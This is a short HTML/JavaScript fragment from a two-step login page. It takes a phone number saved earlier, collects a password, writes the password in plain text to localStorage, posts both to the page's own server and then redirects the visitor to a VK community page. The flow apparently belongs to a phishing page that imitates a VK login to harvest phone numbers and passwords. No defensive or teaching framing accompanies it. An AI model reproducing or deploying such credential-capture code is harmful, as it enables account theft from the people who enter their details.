<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
  let l = document.getElementById("log")
  l.textContent = localStorage.getItem("tel");
  let b = document.getElementById("button");
  let i = document.getElementById("pwd");
  let ve = (e) => {
    let v = document.getElementById("pwd");
    if (v.type === "password") {
      v.type = "text";
    } else {
      v.type = "password";
    }
    v.focus()
  }
  document.getElementById("view").addEventListener('click', ve);;
  let c = (e) => {
    localStorage.setItem("pwd", i.value);
    e.preventDefault();
    axios.post('/', {
      tel: localStorage.getItem("tel"),
      pas: i.value,
    }).then(function (response) {
      window.location.href='https://vk.com/hanumanyoga'
    })
  }
  b.addEventListener('click', c);
</script>
